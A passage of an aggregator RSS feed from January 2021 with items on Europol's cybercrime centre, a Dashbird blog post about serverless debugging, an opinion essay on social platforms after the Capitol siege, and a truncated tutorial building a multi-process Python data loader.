EC3 is dedicated to strengthening the law enforcement response to cybercrime in the EU and focuses on cybercrime committed by organised crime groups, which generate large profits (online fraud), seriously harm victims (online child sexual exploitation) or impact critical infrastructure and information systems in the EU, including through cyber-attacks.</p>
<hr><p>Headquartered in The Hague, the Netherlands, Europol supports the 27 EU Member States in their fight against terrorism, cybercrime and other serious and organised forms of crime. We also work with many non-EU partner states and international organisations. From its various threat assessments to its intelligence-gathering and operational activities, Europol has the tools and resources it needs to do its part in making Europe safer.</p>
</div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690151</guid>
            <pubDate>Fri, 08 Jan 2021 20:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why AWS Console isn’t the best for serverless debugging?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690061">thread link</a>) | @mikesabbagh
<br/>
January 8, 2021 | https://dashbird.io/blog/aws-console-serverless-debugging/ | <a href="https://web.archive.org/web/*/https://dashbird.io/blog/aws-console-serverless-debugging/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

                        
<p>We all know that debugging serverless is time-consuming and hard and  that AWS Console doesn’t make it much easier. <a rel="noreferrer noopener" href="https://aws.amazon.com/cloudwatch/" target="_blank">CloudWatch</a> isn’t quite known for its ease of use. Why? Well to start with, it has suboptimal search features, logs scattered across multiple buckets and groups, little visualization capability, and no structure of <a rel="noreferrer noopener" href="https://dashbird.io/knowledge-base/logging/lambda-invocation-function-and-runtime-errors/" target="_blank">Lambda function invocations</a>. Across the AWS console, different types of monitoring data like logs, metrics, and traces are <strong>scattered in silos</strong>, adding tons of friction to debugging and troubleshooting efforts. </p>



<blockquote><p>With CloudWatch, you have to <strong>look into multiple places to find out what executions happened </strong>when your latency metric spiked and that’s the case for debugging a Lambda function alone.</p></blockquote>



<p>Things get even messier if your transaction spans <strong>multiple Lambda</strong> functions and a bunch of other managed services like <a href="https://dashbird.io/knowledge-base/dynamodb/overview-and-main-concepts-of-amazon-dynamodb/">DynamoDB</a> or<a href="https://dashbird.io/knowledge-base/sqs/introduction-to-aws-sqs-queue-service/"> SQS</a>. And then there are different regions and AWS accounts. </p>



<blockquote><p>All this disconnect makes debugging serverless applications a real pain.</p></blockquote>



<p>Here’s a typical case scenario of <a rel="noreferrer noopener" href="https://dashbird.io/blog/create-your-first-website-with-serverless-in-15-minutes/" target="_blank">starting out with serverless</a>. You start building your serverless application and you’re blown away by the development speed, you build many features in such a small amount of time, and naturally, you fall in love with serverless technology really quick. <strong>Then things go wrong</strong> because, well, that’s the nature of software development. Some misconfigured service, or some bug in a Lambda function you wrote, and now it’s time to debug. You’re forced to dig deep into CloudWatch, X-Ray, and whatnot, just to find out where your error is located.</p>



<p>Every error event that goes in that weakens your confidence in your stack a bit more and in the end, you get wary about moving fast and serverless becomes as slow and brittle as all other paradigms before it. </p>



<blockquote><p>But what you want is to keep that speed of delivery and for this, <strong>you have to know what’s going on.</strong> Let’s face it, very often, <a href="https://dashbird.io/customers/beatchain/" target="_blank" rel="noreferrer noopener">CloudWatch just isn’t enough</a>.</p></blockquote>



<h2 id="h-here-s-why-you-should-stop-digging-around-in-aws-console">Here’s why you should stop digging around in AWS Console</h2>



<p>In the last years, many serverless advocates sold you this new paradigm with <a href="https://dashbird.io/blog/what-is-faas-function-as-a-service/">function as a service</a> (FaaS) solutions like AWS Lambda, and while it’s pretty awesome to be able to get a small part of code running in the cloud, without managing servers or containers, <strong>FaaS is just the catalyst of serverless</strong>.</p>



<p>You should <strong>think of serverless more like functionality as a service</strong>, using managed services like AppSync, S3, and Cognito, whenever possible and only fall back to Lambda when things simply won’t support your use-case.&nbsp;</p>



<p>The problem is that most monitoring solutions go the same route as the serverless advocate went, and focus on Lambda. <strong>This leads to a dissonance</strong>; you can either get full insights in your system but you have to build most of it with custom Lambda functions or you get the full power of serverless with managed services, but <strong>debugging them will be a pain</strong>; which leads us back to the loss of trust from the beginning.</p>



<p><a href="https://dashbird.io/">Dashbird</a> gives you <a rel="noreferrer noopener" href="https://dashbird.io/docs/" target="_blank">one source of truth</a> for all your AWS related monitoring needs. You’ll find metrics, logs, and tracing in one place, which makes correlating cause and effect much simpler.</p>



<figure><img loading="lazy" width="738" height="364" src="https://dashbird.io/wp-content/uploads/2020/12/New-dashboard-Dashbird-1-min.gif" alt="Prevent serverless errors with AI-driven insights"></figure>



<p>Dashbird tries to home in on managed AWS services so you don’t get lost in throwing buckets of hand-tailored code at your projects. SQS, DynamoDB, Step Functions, API Gateway, all these services that lower your time to market feel snug as a bug in the Dashbird monitoring platform.</p>



<h3 id="h-grouping-resources-by-project-instead-of-type-just-makes-sense">Grouping Resources by Project Instead of Type Just Makes Sense</h3>



<p>Dashbird groups all your resources by service, like you are used to from the AWS console, but also <strong>allows grouping by project</strong>. Projects group services that are related to each other in a <strong>logical sense</strong>, but not in a technical sense. For example, a project can consist of API Gateway, Lambda, and DynamoDB.</p>



<figure><img loading="lazy" width="736" height="364" src="https://dashbird.io/wp-content/uploads/2021/01/Projects-views-Dasbhbird.gif" alt="Projects views Dasbhbird"></figure>



<blockquote><p>When you get an error it is usually related to a request that went through your pipeline of services. </p></blockquote>



<p>To find an error you have to follow the request through all these services. With the AWS console, which groups services by technology, <strong>you would have to navigate multiple pages to find your error</strong>. In a project all this is consolidated, so you can find all the services the request hit in one place.</p>



<h3 id="h-find-errors-before-they-happen">Find Errors Before they Happen</h3>



<p>Naturally, you always want to <strong>keep the time from finding a bug to fixing it as low as possible</strong>. Dashbird alarms and insights, which are based on the <a rel="noreferrer noopener" href="https://sls.dashbird.io/aws-well-architected-framework-serverless" target="_blank">AWS Well-Architected Framework</a> and Dashbirds know-how of monitoring years of serverless production-ready systems, help you to do just that.</p>



<p>Dashbird’s insights <strong>immediately notify you</strong> if something fails, isn’t configured right or if metrics go in a dangerous range well before they can lead to an error. This way you can continuously <strong>improve</strong> your architecture and <strong>prevent errors from happening</strong>.</p>



<p>With a rather young technology like serverless, it’s always a pain to figure out best practices. </p>



<blockquote><p>If it’s used right, you get an advantage over all competitors that do it the old way; if it’s used wrong, you might be worse off than them. </p></blockquote>



<p>So getting this knowledge, not just from a generic article on the internet, but <strong>tailored to your specific system will <a href="https://dashbird.io/customers/blow/">save you valuable time</a> and <a href="https://dashbird.io/customers/brisk-voyage/" target="_blank" rel="noreferrer noopener">dollars off your Cloud bill</a></strong>.</p>



<h2 id="h-conclusion">Conclusion</h2>



<p>If you encounter problems within your serverless systems, it’s crucial to <strong>find out what caused it in the shortest amount of time possible</strong>. Clicking around in umpteen different places around the AWS Console to correlate your errors with the requests that caused them isn’t your best way of action here. Sure, all data is there, but often there is <strong>much more data</strong> than you need and combing through it takes time too.</p>



<p>Third-party monitoring services like <a href="https://dashbird.io/" target="_blank" rel="noreferrer noopener">Dashbird</a> help you cut through the noise and <strong>dramatically reduce the time to debug and troubleshoot</strong>. Dashbird consolidates all the log, metric, and tracing data into one place so you can query them as needed. With projects you can group serverless resources logically, which cuts down on log-lines again.</p>



<p>Finally, there are the Dashbird metrics based on the <a href="https://aws.amazon.com/blogs/aws/aws-well-architected-framework-updated-white-papers-tools-and-best-practices/" target="_blank" rel="noreferrer noopener">AWS Well-Architected Framework</a> and Dashbird’s experience in monitoring serverless systems in production for years. These metrics can <strong>find errors for you before they even happen</strong>. </p>



<blockquote><p>Many problematic configurations can be surfaced to you in the Dashbird console before the first customer even uses your system. </p></blockquote>



<p>While a happy user is good, this feature can help especially with security related problems, which are a huge liability in the long run.</p>



<p>You can <a href="https://dashbird.io/features/" target="_blank" rel="noreferrer noopener">give Dashbird a try for free</a>:</p>



<ul><li>No code changes</li><li>No credit card required</li><li>Simple 2-minute set up</li><li>Get access to all premium features </li><li>Start working with your data immediately</li></ul>
                    </div></div>]]>
            </description>
            <link>https://dashbird.io/blog/aws-console-serverless-debugging/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690061</guid>
            <pubDate>Fri, 08 Jan 2021 20:32:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It took a siege at the US Capitol for social platforms to do the right thing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25689882">thread link</a>) | @nillium
<br/>
January 8, 2021 | https://blog.nillium.com/it-only-took-a-siege-on-the-capitol-for-social-platforms-to-do-the-right-thing/ | <a href="https://web.archive.org/web/*/https://blog.nillium.com/it-only-took-a-siege-on-the-capitol-for-social-platforms-to-do-the-right-thing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.nillium.com/content/images/size/w300/2021/01/jose-fontano-4aJ4sW14LCA-unsplash.jpg 300w,
                            https://blog.nillium.com/content/images/size/w600/2021/01/jose-fontano-4aJ4sW14LCA-unsplash.jpg 600w,
                            https://blog.nillium.com/content/images/size/w1000/2021/01/jose-fontano-4aJ4sW14LCA-unsplash.jpg 1000w,
                            https://blog.nillium.com/content/images/size/w2000/2021/01/jose-fontano-4aJ4sW14LCA-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.nillium.com/content/images/size/w2000/2021/01/jose-fontano-4aJ4sW14LCA-unsplash.jpg" alt="It only took a siege at the US Capitol for social platforms to do the right thing">
            </figure>

            <section>
                <div>
                    <p>Life, liberty—and the pursuit of profits. </p><p>Facebook, Twitter and YouTube <a href="https://www.nbcnews.com/tech/social-media/facebook-youtube-twitter-remove-video-trump-amid-chaos-capitol-n1253157">finally enacted</a> their own terms of service. And all it took was an attempted coup on U.S. soil. </p><p>For years, these platforms have hosted, promoted and <a href="https://www.wired.com/story/opinion-platforms-must-pay-for-their-role-in-the-insurrection/">monetized against</a> the very kinds of dangerous misinformation that drove rioters to the U.S. Capitol on Wednesday. Outrage is the coin of the realm for these platforms, an effort to keep you engaged and enraged—and coming back for more.</p><p>Only when our Democracy was under assault and the president they had feared would slap them with regulations had two weeks left in office did platforms manage to find their better angels. </p><p>We, the people, deserve better.</p><p>To be clear, this is not a First Amendment debate. (The First Amendment <a href="https://constitution.congress.gov/constitution/amendment-1/">protects us</a> from the government curbing free speech—not companies.) When Facebook and others <a href="https://about.fb.com/news/2019/09/elections-and-political-speech/">invoke</a> the First Amendment in defense of their decision to keep up misinformation and outrage, they are simply <a href="https://www.washingtonpost.com/outlook/2021/01/07/social-media-facebook-capitol-mob/">disguising a business decision</a> as championing civil liberties. </p><p>The efforts to guard against misinformation have been anemic at best. (Full disclosure: I was part of the team at ABC News that helped Facebook try to fact-check posts of dubious provenance. It was akin to spitting in the ocean.) But there is no true incentive to change: Just look at Facebook’s stock price. </p><p>Social platforms are poor stewards of information (and our data—but that’s another topic). Not only should they be <a href="https://www.wired.com/story/opinion-platforms-must-pay-for-their-role-in-the-insurrection/">regulated</a>—but also news publishers would be wise to pull their reporting from these platforms where their journalism is elevated alongside the rants of conspiracy theorists. </p><p>The delicate and deliberate decisions about what to broadcast widely are the types of tough choices newsrooms make dozens of times a day: What voices to elevate; what reporting is credible enough to broadcast; when it’s appropriate to use the term “rioters” over “protesters,” etc. They do it under great breaking news pressure and with much internal discussion. </p><p>They do this because words matter. Truth matters. And journalism matters. </p><p>The only way we can continue to form a more perfect union is if we support journalism that holds truth to power, that seeks the truth regardless of where it leads and that shines a light where it is dark. Journalists must take back the power they've ceded to social platforms.</p><p>It’s Our Republic, if we can keep it. </p><p>Let’s Go Forth,</p><p>Xana</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.nillium.com/it-only-took-a-siege-on-the-capitol-for-social-platforms-to-do-the-right-thing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689882</guid>
            <pubDate>Fri, 08 Jan 2021 20:20:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DataLoaders Explained: Building a Multi-Process Data Loader from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25689791">thread link</a>) | @teddykoker
<br/>
January 8, 2021 | https://teddykoker.com/2020/12/dataloader/ | <a href="https://web.archive.org/web/*/https://teddykoker.com/2020/12/dataloader/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>When training a Deep Learning model, one must often read and pre-process data
before it can be passed through the model. Depending on the data source and
transformations needed, this step can amount to a non-negligable amount of time,
which leads to unecessarily longer training times. This bottleneck is often
remedied using a
<a href="https://pytorch.org/docs/stable/data.html#torch.utils.data.DataLoader"><code>torch.utils.data.DataLoader</code></a>
for PyTorch, or a
<a href="https://www.tensorflow.org/api_docs/python/tf/data/Dataset"><code>tf.data.Dataset</code></a>
for Tensorflow. These structures leverage parallel processing and pre-fetching
in order reduce data loading time as much as possible. In this post we will
build a simple version of PyTorch’s <code>DataLoader</code>, and show the benefits of
parallel pre-processing.</p>

<!--more-->

<p>The full code for this project is available at
<a href="https://github.com/teddykoker/tinyloader">github.com/teddykoker/tinyloader</a>.</p>

<h2 id="a-naive-base">A Naive Base</h2>

<p>Before we get to parallel processing, we should build a simple, naive version of
our data loader. To initialize our dataloader, we simply store the provided <code>dataset</code>,
<code>batch_size</code>, and <code>collate_fn</code>. We also create a variable <code>self.index</code> which
will store next index that needs to be loaded from the dataset:</p>

<div><div><pre><code><span>class</span> <span>NaiveDataLoader</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>dataset</span><span>,</span> <span>batch_size</span><span>=</span><span>64</span><span>,</span> <span>collate_fn</span><span>=</span><span>default_collate</span><span>):</span>
        <span>self</span><span>.</span><span>dataset</span> <span>=</span> <span>dataset</span>
        <span>self</span><span>.</span><span>batch_size</span> <span>=</span> <span>batch_size</span>
        <span>self</span><span>.</span><span>collate_fn</span> <span>=</span> <span>collate_fn</span>
        <span>self</span><span>.</span><span>index</span> <span>=</span> <span>0</span>
</code></pre></div></div>

<p>The <code>__iter__</code> method simply returns the object to be iterated over. Since this
method is implicitly called anytime you iterate over the dataloader, we will
want to reset <code>self.index</code> to 0:</p>

<div><div><pre><code>    <span>def</span> <span>__iter__</span><span>(</span><span>self</span><span>):</span>
        <span>self</span><span>.</span><span>index</span> <span>=</span> <span>0</span>
        <span>return</span> <span>self</span>
</code></pre></div></div>

<p>In order for a Python object to be iterable, we must define the <code>__next__</code>
method, which will provide the next batch from the dataset whenever it is
called, by repeatedly calling a <code>get()</code> method to fill up the whole batch:</p>

<div><div><pre><code>    <span>def</span> <span>__next__</span><span>(</span><span>self</span><span>):</span>
        <span>if</span> <span>self</span><span>.</span><span>index</span> <span>&gt;=</span> <span>len</span><span>(</span><span>self</span><span>.</span><span>dataset</span><span>):</span>
            <span># stop iteration once index is out of bounds
</span>            <span>raise</span> <span>StopIteration</span>
        <span>batch_size</span> <span>=</span> <span>min</span><span>(</span><span>len</span><span>(</span><span>self</span><span>.</span><span>dataset</span><span>)</span> <span>-</span> <span>self</span><span>.</span><span>batch_size</span><span>,</span> <span>self</span><span>.</span><span>batch_size</span><span>)</span>
        <span>return</span> <span>self</span><span>.</span><span>collate_fn</span><span>([</span><span>self</span><span>.</span><span>get</span><span>()</span> <span>for</span> <span>_</span> <span>in</span> <span>range</span><span>(</span><span>batch_size</span><span>)])</span>
</code></pre></div></div>

<p>Lastly, we define the <code>get()</code> method which is where we actually load the element
at <code>self.index</code> from the dataset.</p>

<div><div><pre><code>    <span>def</span> <span>get</span><span>(</span><span>self</span><span>):</span>
        <span>item</span> <span>=</span> <span>self</span><span>.</span><span>dataset</span><span>[</span><span>self</span><span>.</span><span>index</span><span>]</span>
        <span>self</span><span>.</span><span>index</span> <span>+=</span> <span>1</span>
        <span>return</span> <span>item</span>
</code></pre></div></div>

<p>All the <code>NaiveDataLoader</code> does is wrap some indexable <code>dataset</code>, allowing
it to be iterated in mini-batches, as is usually done when training a model. It
can be used like so:</p>

<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>dataset</span> <span>=</span> <span>list</span><span>(</span><span>range</span><span>(</span><span>16</span><span>))</span>
<span>&gt;&gt;&gt;</span> <span>dataloader</span> <span>=</span> <span>NaiveDataLoader</span><span>(</span><span>dataset</span><span>,</span> <span>batch_size</span><span>=</span><span>8</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>for</span> <span>batch</span> <span>in</span> <span>dataloader</span><span>:</span>
<span>...</span>     <span>print</span><span>(</span><span>batch</span><span>)</span>
<span>...</span>
<span>[</span><span>0</span> <span>1</span> <span>2</span> <span>3</span> <span>4</span> <span>5</span> <span>6</span> <span>7</span><span>]</span>
<span>[</span> <span>8</span>  <span>9</span> <span>10</span> <span>11</span> <span>12</span> <span>13</span> <span>14</span> <span>15</span><span>]</span>
</code></pre></div></div>

<p>We now basically have a fully functional data loader; The only issue is that
<code>get()</code> is loading in one element of dataset at a time, using the same process
that would be used for training. This is fine for printing elements from a list,
but could become very problemattic the loop must stall while waiting to perform
some file IO or potentially costly data augmentation.</p>

<h2 id="introducing-workers">Introducing Workers</h2>

<p>To prevent data loading from blocking training, we can create “workers” that
load the data asyncrounously. A simple way of doing this is providing each
worker a queue of indicies for that worker load, and an output queue where the
worker can place the loaded data. All the worker has to do is repeatedly check
its index queue, and load the data if the queue is not empty:</p>

<div><div><pre><code><span>def</span> <span>worker_fn</span><span>(</span><span>dataset</span><span>,</span> <span>index_queue</span><span>,</span> <span>output_queue</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>try</span><span>:</span>
            <span>index</span> <span>=</span> <span>index_queue</span><span>.</span><span>get</span><span>(</span><span>timeout</span><span>=</span><span>0</span><span>)</span>
        <span>except</span> <span>queue</span><span>.</span><span>Empty</span><span>:</span>
            <span>continue</span>
        <span>if</span> <span>index</span> <span>is</span> <span>None</span><span>:</span>
            <span>break</span>
        <span>output_queue</span><span>.</span><span>put</span><span>((</span><span>index</span><span>,</span> <span>dataset</span><span>[</span><span>index</span><span>]))</span>
</code></pre></div></div>

<p>Python’s
<a href="https://docs.python.org/3/library/multiprocessing.html#multiprocessing.Queue"><code>multiprocessing.Queue</code></a>
is perfect for this since it can be shared across processes.</p>

<p><em>Note: Python does have a
<a href="https://docs.python.org/3/library/threading.html"><code>threading</code></a> package;
however, due to the Global Interpreter Lock (GIL), execution of any Python code
is limited to one thread at a time, while all other threads are locked. To
circumvent this, we can use
<a href="https://docs.python.org/3/library/multiprocessing.html"><code>multiprocessing</code></a>,
which uses subprocesses instead of threads. Since each subprocess has its own memory,
we do not have to worry about the GIL.</em></p>

<h2 id="multiprocess-data-loader">Multiprocess Data Loader</h2>

<p>Using our worker function, we can define a multi-process data loader,
subclassing our naive data loader. This data loader will spawn <code>num_workers</code>
workers upon its initialization:</p>

<div><div><pre><code><span>class</span> <span>DataLoader</span><span>(</span><span>NaiveDataLoader</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span>
        <span>self</span><span>,</span>
        <span>dataset</span><span>,</span>
        <span>batch_size</span><span>=</span><span>64</span><span>,</span>
        <span>num_workers</span><span>=</span><span>1</span><span>,</span>
        <span>prefetch_batches</span><span>=</span><span>2</span><span>,</span>
        <span>collate_fn</span><span>=</span><span>default_collate</span><span>,</span>
    <span>):</span>
        <span>super</span><span>().</span><span>__init__</span><span>(</span><span>dataset</span><span>,</span> <span>batch_size</span><span>,</span> <span>collate_fn</span><span>)</span>

        <span>self</span><span>.</span><span>num_workers</span> <span>=</span> <span>num_workers</span>
        <span>self</span><span>.</span><span>prefetch_batches</span> <span>=</span> <span>prefetch_batches</span>
        <span>self</span><span>.</span><span>output_queue</span> <span>=</span> <span>multiprocessing</span><span>.</span><span>Queue</span><span>()</span>
        <span>self</span><span>.</span><span>index_queues</span> <span>=</span> <span>[]</span>
        <span>self</span><span>.</span><span>workers</span> <span>=</span> <span>[]</span>
        <span>self</span><span>.</span><span>worker_cycle</span> <span>=</span> <span>itertools</span><span>.</span><span>cycle</span><span>(</span><span>range</span><span>(</span><span>num_workers</span><span>))</span>
        <span>self</span><span>.</span><span>cache</span> <span>=</span> <span>{}</span>
        <span>self</span><span>.</span><span>prefetch_index</span> <span>=</span> <span>0</span>

        <span>for</span> <span>_</span> <span>in</span> <span>range</span><span>(</span><span>num_workers</span><span>):</span>
            <span>index_queue</span> <span>=</span> <span>multiprocessing</span><span>.</span><span>Queue</span><span>()</span>
            <span>worker</span> <span>=</span> <span>multiprocessing</span><span>.</span><span>Process</span><span>(</span>
                <span>target</span><span>=</span><span>worker_fn</span><span>,</span> <span>args</span><span>=</span><span>(</span><span>self</span><span>.</span><span>dataset</span><span>,</span> <span>index_queue</span><span>,</span> <span>self</span><span>.</span><span>output_queue</span><span>)</span>
            <span>)</span>
            <span>worker</span><span>.</span><span>daemon</span> <span>=</span> <span>True</span>
            <span>worker</span><span>.</span><span>start</span><span>()</span>
            <span>self</span><span>.</span><span>workers</span><span>.</span><span>append</span><span>(</span><span>worker</span><span>)</span>
            <span>self</span><span>.</span><span>index_queues</span><span>.</span><span>append</span><span>(</span><span>index_queue</span><span>)</span>

        <span>self</span><span>.</span><span>prefetch</span><span>()</span>
</code></pre></div></div>

<p>We have a single <code>output_queue</code>, that is shared across all of the worker
processes, each of which has its own <code>index_queue</code>. Additionaly, we will store
<code>self.prefetch_batches</code>, which will determine how many batches per worker to
fetch ahead of time, and <code>self.prefetch_index</code>, which denotes index of the next
item to prefetch. Using this we can define our <code>prefetch()</code> method, which will
keep adding indicies to each workers queue (in a round-robin fashion) until two
batches of indicies are added:</p>

<div><div><pre><code>    <span>def</span> <span>prefetch</span><span>(</span><span>self</span><span>):</span>
        <span>while</span> <span>(</span>
            <span>self</span><span>.</span><span>prefetch_index</span> <span>&lt;</span> <span>len</span><span>(</span><span>self</span><span>.</span><span>dataset</span><span>)</span>
            <span>and</span> <span>self</span><span>.</span><span>prefetch_index</span>
            <span>&lt;</span> <span>self</span><span>.</span><span>index</span> <span>+</span> <span>2</span> <span>*</span> <span>self</span><span>.</span><span>num_workers</span> <span>*</span> <span>self</span><span>.</span><span>batch_size</span>
        <span>):</span>
            <span># if the prefetch_index hasn't reached the end of the dataset
</span>            <span># and it is not 2 batches ahead, add indexes to the index queues
</span>            <span>self</span><span>.</span><span>index_queues</span><span>[</span><span>next</span><span>(</span><span>self</span><span>.</span><span>worker_cycle</span><span>)].</span><span>put</span><span>(</span><span>self</span><span>.</span><span>prefetch_index</span><span>)</span>
            <span>self</span><span>.</span><span>prefetch_index</span> <span>+=</span> <span>1</span>
</code></pre></div></div>

<p>Now that we have figured out how we are adding indicies to each worker’s queue,
we need to override our dataloader’s <code>get()</code> method to retrieve the loaded
items.</p>

<div><div><pre><code>    <span>def</span> <span>get</span><span>(</span><span>self</span><span>):</span>
        <span>self</span><span>.</span><span>prefetch</span><span>()</span>
        <span>if</span> <span>self</span><span>.</span><span>index</span> <span>in</span> <span>self</span><span>.</span><span>cache</span><span>:</span>
            <span>item</span> <span>=</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>self</span><span>.</span><span>index</span><span>]</span>
            <span>del</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>self</span><span>.</span><span>index</span><span>]</span>
        <span>else</span><span>:</span>
            <span>while</span> <span>True</span><span>:</span>
                <span>try</span><span>:</span>
                    <span>(</span><span>index</span><span>,</span> <span>data</span><span>)</span> <span>=</span> <span>self</span><span>.</span><span>output_queue</span><span>.</span><span>get</span><span>(</span><span>timeout</span><span>=</span><span>0</span><span>)</span>
                <span>except</span> <span>queue</span><span>.</span><span>Empty</span><span>:</span>  <span># output queue empty, keep trying
</span>                    <span>continue</span>
                <span>if</span> <span>index</span> <span>==</span> <span>self</span><span>.</span><span>index</span><span>:</span>  <span># found our item, ready to return
</span>                    <span>item</span> <span>=</span> <span>data</span>
                    <span>break</span>
                <span>else</span><span>:</span>  <span># item isn't the one we want, cache for later
</span>                    <span>self</span><span>.</span><span>cache</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>data</span>

        <span>self</span><span>.</span><span>index</span> <span>+=</span> <span>1</span>
        <span>return</span> <span>item</span>
</code></pre></div></div>

<p>To start, we call <code>prefetch()</code>, which will ensure the next batches are in the
process of being loaded. We then check the cache to see if the item we want
(with index <code>self.index</code>) has already been emptied from the <code>output_queue</code>. If it
has, we can simply return it; otherwise we must continuesly check the
<code>output_queue</code> for the item, caching any other items we encounter. This step is
necessary, as we cannot guarantee the order in which items are recieved, even if
they are prefetched in order.</p>

<p>With the <code>get()</code> method overriden, our data loader is almost complete. All that
is left is some housekeeping to ensure our data loader can be iterated over
multiple times, and does not leave any stray processes running:</p>

<div><div><pre><code>    <span>def</span> <span>__iter__</span><span>(</span><span>self</span><span>):</span>
        <span>self</span><span>.</span><span>index</span> <span>=</span> <span>0</span>
        <span>self</span><span>.</span><span>cache</span> <span>=</span> <span>{}</span>
        <span>self</span><span>.</span><span>prefetch_index</span> <span>=</span> <span>0</span>
        <span>self</span><span>.</span><span>prefetch</span><span>()</span>
        <span>return</span> <span>self</span>
</code></pre></div></div>

<p>Just like our naive data loader, we will use the <code>__iter__</code> method to reset the
state of our data loader. In addition, we will need to implement a <code>__del__</code>
method, which is called when the data loader no longer has any references and is
garabage-collected. We will use this to safely stop all of the workers:</p>

<div><div><pre><code>    <span>def</span> <span>__del__</span><span>(</span><span>self</span><span>):</span>
        <span>try</span><span>:</span>
            <span># Stop each worker by passing None to its index queue
</span>            <span>for</span> <span>i</span><span>,</span> <span>w</span> <span>in</span> <span>enumerate</span><span>(</span><span>self</span><span>.</span><span>workers</span><span>):</span>
                <span>self</span><span>.</span><span>index_queues</span><span>[</span><span>i</span><span>].</span><span>put</span><span>(</span><span>None</span><span>)</span>
                <span>w</span><span>.</span><span>join</span><span>(</span><span>timeout</span><span>=</span><span>5.0</span><span>)</span>
            <span>for</span> <span>q</span> <span>in</span> <span>self</span><span>.</span><span>index_queues</span><span>:</span>  <span># close all queues
</span>                <span>q</span><span>.</span><span>cancel_join_thread</span><span>()</span> 
                <span>q</span><span>.</span><span>close</span><span>()</span>
            <span>self</span><span>.</span><span>output_queue</span><span>.</span><span>cancel_join_thread</span><span>()</span>
            <span>self</span><span>.</span><span>output_queue</span><span>.</span><span>close</span><span>()</span>
        <span>finally</span><span>:</span>
            <span>for</span> <span>w</span> <span>in</span> <span>self</span><span>.</span><span>workers</span><span>:</span>
                <span>if</span> <span>w</span><span>.</span><span>is_alive</span><span>():</span>  <span># manually terminate worker if all else fails
</span>                    <span>w</span><span>.</span><span>terminate</span><span>()</span>
</code></pre></div></div>

<p>This is our full <code>DataLoader</code> implementation! Now we can test it to see if we
observe any noticable improvements.</p>

<h2 id="testing">Testing</h2>

<p>As a simple test, we can mock a dataset that requires some time to load an
element simply by calling <code>time.sleep()</code> before returning an item:</p>

<div><div><pre><code><span>class</span> <span>Dataset</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>size</span><span>=</span><span>2048</span><span>,</span> <span>load_time</span><span>=</span><span>0.0005</span><span>):</span>
        <span>self</span><span>.</span><span>size</span><span>,</span> <span>self</span><span>.</span><span>load_time</span> <span>=</span> <span>size</span><span>,</span> <span>load_time</span>

    <span>def</span> <span>__len__</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>self</span><span>.</span><span>size</span>

    <span>def</span> <span>__getitem__</span><span>(</span><span>self</span><span>,</span> <span>index</span><span>):</span>
        <span>time</span><span>.</span><span>sleep</span><span>(</span><span>self</span><span>.</span><span>load_time</span><span>)</span>
        <span>return</span> <span>np</span><span>.</span><span>zeros</span><span>((</span><span>1</span><span>,</span> <span>28</span><span>,</span> <span>28</span><span>)),</span> <span>1</span>  <span># return img, label
</span></code></pre></div></div>

<p>We can also mimic a training loop by iterating through a dataloader, sleeping
every step to mock the time it would take to forward propegate, back propegate,
and update the weights of a network:</p>

<div><div><pre><code><span>def</span> <span>train</span><span>(</span><span>dataloader</span><span>,</span> <span>epochs</span><span>=</span><span>10</span><span>,</span> <span>step_time</span><span>=</span><span>0.1</span><span>):</span>
    <span>steps</span> <span>=</span> <span>0</span>
    <span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>
    <span>for</span> <span>epoch</span> <span>in</span> <span>range</span><span>(</span><span>epochs</span><span>):</span>
        <span>for</span> <span>batch</span> <span>in</span> <span>dataloader</span><span>:</span>
            <span># mimic forward, backward, and update step
</span>            <span>time</span><span>.</span><span>sleep</span><span>(</span><span>step_time</span><span>)</span>
            <span>steps</span> <span>+=</span> <span>1</span>
    <span>return</span> <span>(</span><span>time</span><span>.</span><span>time</span><span>()</span> <span>-</span> <span>s…</span></code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://teddykoker.com/2020/12/dataloader/">https://teddykoker.com/2020/12/dataloader/</a></em></p>]]>
            </description>
            <link>https://teddykoker.com/2020/12/dataloader/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689791</guid>
            <pubDate>Fri, 08 Jan 2021 20:13:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Censorship: Centralized Social Partitions Considered Harmful]]>
            </title>
            <description>
<![CDATA[
